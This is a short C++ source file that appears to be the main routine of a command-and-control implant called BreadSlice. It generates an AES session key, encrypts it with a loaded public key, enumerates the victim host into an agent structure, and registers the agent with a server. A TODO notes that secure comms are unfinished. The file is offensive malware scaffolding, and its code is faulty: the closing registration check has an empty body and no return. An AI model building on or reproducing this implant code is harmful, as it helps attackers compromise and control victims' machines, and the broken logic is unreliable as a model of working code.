// BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.



#include "Http.h"
#include "enum.h"
#include "implant.h"

#include "Helpers.h"



Agent g_ImplantData = { 0 };

int main()

//TODO finish establishing secure comms.
{
    ltc_mp = ltm_desc;
    register_all_ciphers();
    register_all_hashes();
    register_all_prngs();

    unsigned char* PublicKey;
    unsigned long PublicKeySize;
    unsigned long SymmetricKeySize = 32;

    prng_state* prng = CreatePRNGState();
    char* SymmetricKey = CreateAESKey(prng);
    sprng_done(prng);
    free(prng);

    if (ReadPublicKey(&PublicKey, &PublicKeySize) != 0) {
        printf("[error] attempting to read public key\n");
        return -1;
    }
    EncryptAESKey(SymmetricKey, SymmetricKeySize, PublicKey, PublicKeySize);


    Enumerate(&g_ImplantData);
   
    
    if (!RegisterAgent());
     
}

